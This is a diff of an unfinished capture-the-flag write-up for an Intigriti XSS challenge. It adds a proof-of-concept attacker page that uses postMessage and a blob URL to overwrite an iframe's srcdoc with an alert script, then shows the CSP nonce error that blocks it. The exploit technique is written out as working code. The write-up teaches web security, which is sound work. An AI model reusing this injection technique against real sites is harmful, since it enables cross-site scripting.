@@ -587,15 +587,41 @@ from https://editor.43z.one/244ck it would show `editor.43z.one`.
 This is perfect. We will use this fact about `srcdoc` to our advantage.
 We will craft a message that triggers this part of the code
 ```
-...
   case 'set':
     [...document.querySelectorAll(e.data.element)].forEach(s => s.setAttribute(e.data.attr, e.data.value));
     break;
-...
 ```
-And change the `srcdoc` of the `<iframe>`. At this point the iframe will no longer
-hold the `magic.php` but our blobed URL
+And change the `srcdoc` of the `<iframe>`. Just a quick reminder, at that  point 
+the iframe will no longer hold the `magic.php` but our blobed URL which send
+the command the change the `srcdoc` in the first place.
 
+https://editor.43z.one/yv518
+```
+<iframe onload=run() id=i src="https://challenge-0922.intigriti.io/challenge/"></iframe>
+<script>
+  run = e => {
+    burl = URL.createObjectURL(new Blob([`
+      <script>
+        parent.postMessage({
+          element: '#ball',
+          action: 'set',
+          attr: 'srcdoc',
+          value: '<script>alert(document.domain)</'+'script>'
+        }, '*') 
+      <`+`/script>
+    `], {type : 'text/html'}))
+    i.contentWindow.frames[0].location = burl 
+  }
+</script>
+```
+But what is that. Another error!
+```
+Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'nonce-fd66e11600987aa40022b9942292461'". Either the 'unsafe-inline' keyword, a hash ('sha256-X6WoVv8sUlFXk0r+MI/R+p2PsbD1k74Z+jLIpYAjIgE='), or a nonce ('nonce-...') is required to enable inline execution.
+```
+We forgot! As changing the `srcdoc` does not change any context, the CSP of `challenge-0922.intigriti.io`
+still is enforced! That effectively means the `script` block that holds our payload will need
+to have the correct `nonce` to be allowed to execute.
 
+So how on earth will we get the `nonce`?
 
 NOT YET FINISHED
